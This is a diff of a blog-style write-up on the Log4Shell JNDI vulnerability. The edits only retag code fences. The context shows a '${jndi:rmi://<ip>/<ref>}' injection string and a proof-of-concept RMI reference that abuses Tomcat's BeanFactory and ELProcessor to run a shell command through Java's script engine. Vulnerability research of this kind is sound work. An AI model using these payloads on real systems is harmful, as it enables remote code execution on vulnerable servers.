@@ -23,7 +23,7 @@ To be fair, the attack chain is pretty straight forward. I kinda hope all the ot
 
 By looking at log4j's official documents, it's not hard to get an idea on how it basically works. To build a test environment, start a new Java project, and add log4j as library.
 
-```
+```html
 Logger logger = LogManager.getLogger();
 logger.error("${jndi:rmi://<ip>/<ref>}");
 ```
@@ -90,7 +90,7 @@ and as you probably see from some mitigations require the `-Dlog4j2.formatMsgNoL
 
 And let's continue to go down the road. In
 
-```
+```java
 workingBuilder.append(config.getStrSubstitutor().replace(event, value));
 ```
 
@@ -160,7 +160,7 @@ There is a lot more code I didn't include, if you are interested, do the researc
 
 Here is the PoC code:
 
-```
+```java
 ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
 ref.add(new StringRefAddr("forceString", "x=eval"));
 ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()\")"));
@@ -170,7 +170,7 @@ registry.bind("calc", referenceWrapper);
 
 And it calls the `eval` method in `ELProcessor`. One interesting thing about the payload is, it uses the JavaScript engine in Java. Oh boy, is that a pain to work with. With the script engine, you can do more that just a exec one liner. Since in the JS engine, there is no type, you need to assign types to variables, like
 
-```
+```javascript
 var Thread = Java.type('java.lang.Thread')
 var classLoader = Thread.getCurrentThread().getContextClassLoader();
 ```
